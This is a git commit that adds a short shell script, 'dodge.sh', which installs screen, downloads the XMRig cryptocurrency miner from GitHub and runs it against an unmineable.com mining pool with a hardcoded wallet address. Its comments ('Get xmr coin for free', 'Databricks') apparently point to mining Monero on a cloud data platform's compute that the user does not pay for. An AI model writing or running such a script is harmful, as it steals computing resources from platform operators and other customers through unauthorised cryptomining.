8392eecb913f0474dff0ad31cf0c3ffeec3edc75
matovumoney <110832712+matovumoney@users.noreply.github.com>
2022-08-18 10:56:20 +0300

    this

---
+++ dodge.sh
@@ -0,0 +1,13 @@
+####by  matovu mubarak####
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+./xmrig -o rx.unmineable.com:3333-u DG9q5t3RDCJMEA83t1QKtwRKFajhFXGmTR -k --tls --rig-id el
